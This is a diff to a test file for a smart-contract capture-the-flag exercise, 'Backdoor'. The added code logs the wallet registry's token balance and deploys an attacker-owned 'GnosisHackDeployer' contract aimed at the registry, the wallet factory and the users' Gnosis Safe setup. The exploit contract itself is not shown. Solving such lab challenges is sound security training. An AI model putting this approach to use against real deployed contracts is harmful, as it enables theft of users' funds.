@@ -36,7 +36,24 @@ describe('[Challenge] Backdoor', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+           /** CODE YOUR EXPLOIT HERE */
+
+    // ice tester
+    console.log(this.walletRegistry.address);
+    const balance= await this.token.balanceOf(this.walletRegistry.address)
+    console.log("balance of attacker: " + ethers.utils.formatEther(balance));
+    // add ur code before or after ice tester
+    const GnosisHackDeployerFactory = await ethers.getContractFactory(
+      "GnosisHackDeployer",
+      attacker
+    );
+    const exploit = await GnosisHackDeployerFactory.deploy(
+      this.walletRegistry.address,
+      this.walletFactory.address,
+      this.masterCopy.address,
+      users,
+      this.token.address
+    );
     });
 
     after(async function () {
